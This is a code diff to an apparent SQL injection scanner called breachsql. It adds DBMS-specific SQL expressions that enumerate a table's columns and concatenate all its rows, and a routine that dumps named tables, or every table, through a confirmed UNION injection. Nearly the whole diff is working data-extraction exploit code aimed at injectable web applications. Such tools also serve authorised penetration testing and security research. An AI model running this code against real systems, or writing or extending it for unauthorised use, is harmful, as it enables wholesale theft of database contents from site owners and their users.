@@ -15,7 +15,7 @@ from ..log import get_logger
 from .. import crawler as crawler_mod
 from ..http import waf_detect
 from ..http.injector import Injector, parse_post_data
-from ..reporter import ScanResult
+from ..reporter import ScanResult, ExtractionFinding, TableDumpFinding
 from .options import ScanOptions
 from .passive import fetch_seed, run_passive_checks
 from .active import scan_param
@@ -23,7 +23,10 @@ from .blind import run_time_based, run_oob
 from .stacked import run_stacked
 from .extract import extract_value, extract_via_union
 from commonhuman_payloads.sqli import get_extraction_targets
-from ..reporter import ExtractionFinding
+
+# Separators used when serialising dumped rows; chosen to be absent from normal data
+_COL_SEP = "|"
+_ROW_SEP = "||~~||"
 
 logger = get_logger("breachsql.pipeline")
 
@@ -255,6 +258,131 @@ def run(url: str, opts: ScanOptions, injector: Injector, result: ScanResult) -> 
         _run_exploit(url, opts, evasions, injector, result, surfaces)
 
 
+def _columns_expr(table: str, dbms: str) -> str:
+    """Return a scalar SQL expression that yields comma-separated column names for *table*."""
+    if dbms == "sqlite":
+        return f"(SELECT GROUP_CONCAT(name,',') FROM pragma_table_info('{table}'))"
+    if dbms in ("postgres", "postgresql"):
+        return (
+            f"(SELECT STRING_AGG(column_name,',' ORDER BY ordinal_position)"
+            f" FROM information_schema.columns"
+            f" WHERE table_schema='public' AND table_name='{table}')"
+        )
+    if dbms == "mssql":
+        return (
+            f"(SELECT STRING_AGG(column_name,',')"
+            f" WITHIN GROUP (ORDER BY ordinal_position)"
+            f" FROM information_schema.columns WHERE table_name='{table}')"
+        )
+    if dbms == "oracle":
+        return (
+            f"(SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id)"
+            f" FROM all_tab_columns WHERE table_name=UPPER('{table}'))"
+        )
+    # mysql / mariadb / auto
+    return (
+        f"(SELECT GROUP_CONCAT(column_name ORDER BY ordinal_position SEPARATOR ',')"
+        f" FROM information_schema.columns"
+        f" WHERE table_schema=DATABASE() AND table_name='{table}')"
+    )
+
+
+def _dump_expr(table: str, columns: List[str], dbms: str, limit: int = 100) -> str:
+    """Return a scalar SQL expression that GROUP_CONCATs all rows from *table*."""
+    if not columns:
+        return ""
+    if dbms == "sqlite":
+        # COALESCE required: any NULL in the chain makes the whole row NULL and
+        # GROUP_CONCAT silently drops it.  Subquery needed so LIMIT restricts
+        # input rows rather than the single aggregate output row.
+        cols = f"||'{_COL_SEP}'||".join(f"COALESCE(CAST(\"{c}\" AS TEXT),'')" for c in columns)
+        return (
+            f"(SELECT GROUP_CONCAT(c,'{_ROW_SEP}')"
+            f" FROM (SELECT {cols} AS c FROM \"{table}\" LIMIT {limit}) _t)"
+        )
+    if dbms in ("postgres", "postgresql"):
+        cols = f"||'{_COL_SEP}'||".join(f"COALESCE(CAST(\"{c}\" AS TEXT),'')" for c in columns)
+        return (
+            f"(SELECT STRING_AGG({cols},'{_ROW_SEP}')"
+            f" FROM (SELECT * FROM \"{table}\" LIMIT {limit}) _t)"
+        )
+    if dbms == "mssql":
+        cols = "+'|'+".join(f"ISNULL(CAST([{c}] AS NVARCHAR(MAX)),'')" for c in columns)
+        return (
+            f"(SELECT STRING_AGG({cols},'{_ROW_SEP}')"
+            f" FROM (SELECT TOP {limit} * FROM [{table}]) _t)"
+        )
+    if dbms == "oracle":
+        cols = f"||'{_COL_SEP}'||".join(
+            f"NVL(CAST(\"{c}\" AS VARCHAR2(4000)),'')" for c in columns
+        )
+        return (
+            f"(SELECT LISTAGG({cols},'{_ROW_SEP}') WITHIN GROUP (ORDER BY 1)"
+            f" FROM (SELECT * FROM \"{table}\" WHERE ROWNUM<={limit}))"
+        )
+    # mysql / mariadb / auto
+    cols = ",".join(f"IFNULL(CAST(`{c}` AS CHAR),'')" for c in columns)
+    return (
+        f"(SELECT GROUP_CONCAT(CONCAT_WS('{_COL_SEP}',{cols}) SEPARATOR '{_ROW_SEP}')"
+        f" FROM (SELECT * FROM `{table}` LIMIT {limit}) _t)"
+    )
+
+
+def _dump_table_union(
+    table: str,
+    union_finding: Any,
+    surface: Dict[str, Any],
+    evasions: List[str],
+    opts: ScanOptions,
+    injector: Injector,
+    result: ScanResult,
+) -> None:
+    """Dump all rows of *table* using the confirmed UNION injection."""
+    dbms = (result.dbms_detected or opts.dbms or "auto").lower()
+
+    # Phase 1 — discover columns
+    col_expr = _columns_expr(table, dbms)
+    cols_raw = extract_via_union(
+        expr=col_expr,
+        union_finding=union_finding,
+        surface=surface,
+        evasions=evasions,
+        opts=opts,
+        injector=injector,
+    )
+    if not cols_raw:
+        logger.warning("dump: could not retrieve columns for table %s", table)
+        return
+    columns = [c.strip() for c in cols_raw.split(",") if c.strip()]
+    logger.info("dump: %s  columns=%s", table, columns)
+
+    # Phase 2 — extract rows
+    row_expr = _dump_expr(table, columns, dbms)
+    if not row_expr:
+        return
+    raw = extract_via_union(
+        expr=row_expr,
+        union_finding=union_finding,
+        surface=surface,
+        evasions=evasions,
+        opts=opts,
+        injector=injector,
+    )
+    rows: List[List[str]] = []
+    if raw:
+        rows = [r.split(_COL_SEP) for r in raw.split(_ROW_SEP) if r]
+    logger.info("dump: %s  rows=%d", table, len(rows))
+
+    result.table_dumps.append(TableDumpFinding(
+        table=table,
+        columns=columns,
+        rows=rows,
+        url=union_finding.url,
+        parameter=union_finding.parameter,
+        method=union_finding.method,
+    ))
+
+
 def _run_exploit(
     url: str,
     opts: ScanOptions,
@@ -263,23 +391,10 @@ def _run_exploit(
     result: ScanResult,
     surfaces: List[Dict[str, Any]],
 ) -> None:
-    """Extract proof-of-impact data and optionally dump a table."""
+    """Extract proof-of-impact data and optionally dump tables."""
 
     dbms = (result.dbms_detected or opts.dbms or "auto").lower()
     targets = get_extraction_targets(dbms)
-
-    if opts.dump:
-        _tbl = opts.dump
-        if dbms in ("sqlite", "postgres", "postgresql"):
-            dump_expr = f"(SELECT GROUP_CONCAT(c, '|') FROM (SELECT * FROM \"{_tbl}\" LIMIT 50) t)"
-        elif dbms in ("mssql",):
-            dump_expr = f"(SELECT STRING_AGG(CAST(c AS NVARCHAR(MAX)),'|') FROM (SELECT * FROM [{_tbl}]) t)"
-        else:
-            dump_expr = (
-                f"(SELECT GROUP_CONCAT(CAST(c AS CHAR) SEPARATOR '|')"
-                f" FROM (SELECT CONCAT_WS(',', *) AS c FROM `{_tbl}` LIMIT 50) t)"
-            )
-        targets = targets + [(f"dump:{_tbl}", dump_expr)]
 
     # Prefer UNION extraction (one request per target, no binary search)
     if result.union_based:
@@ -318,9 +433,45 @@ def _run_exploit(
                         logger.debug("extract: no value returned for %s", label)
                 except Exception as exc:
                     result.append_error(f"Extraction failed ({label}): {exc}")
+
+            # Table dump(s)
+            tables_to_dump: List[str] = []
+            if opts.dump:
+                tables_to_dump.append(opts.dump)
+            if opts.dump_all:
+                # Re-use the already-extracted tables value when possible
+                tables_expr = next((e for lbl, e in targets if lbl == "tables"), None)
+                tables_val = next(
+                    (f.value for f in result.extracted if f.expr == tables_expr),
+                    None,
+                )
+                if not tables_val and tables_expr:
+                    try:
+                        tables_val = extract_via_union(
+                            expr=tables_expr,
+                            union_finding=union_finding,
+                            surface=surface,
+                            evasions=evasions,
+                            opts=opts,
+                            injector=injector,
+                        )
+                    except Exception as exc:
+                        result.append_error(f"dump-all: table list extraction failed: {exc}")
+                if tables_val:
+                    for tbl in tables_val.split(","):
+                        tbl = tbl.strip()
+                        if tbl and tbl not in tables_to_dump:
+                            tables_to_dump.append(tbl)
+
+            for tbl in tables_to_dump:
+                try:
+                    _dump_table_union(tbl, union_finding, surface, evasions, opts, injector, result)
+                except Exception as exc:
+                    result.append_error(f"Dump failed ({tbl}): {exc}")
+
             return
 
-    # Fall back to boolean / time-blind extraction
+    # Fall back to boolean / time-blind extraction (dump not supported over blind)
     best_finding = None
     mode = "boolean"
     if result.boolean_based:
@@ -353,6 +504,11 @@ def _run_exploit(
         baseline = baseline_resp if baseline_resp is not None else ""
     except Exception:
         baseline = ""
+
+    if opts.dump or opts.dump_all:
+        logger.warning(
+            "Table dump requires UNION-based injection; no UNION finding available — skipping dump"
+        )
 
     logger.info("Extracting %d target(s) via %s-blind on %s [%s]",
                 len(targets), mode, best_finding.parameter, best_finding.url)
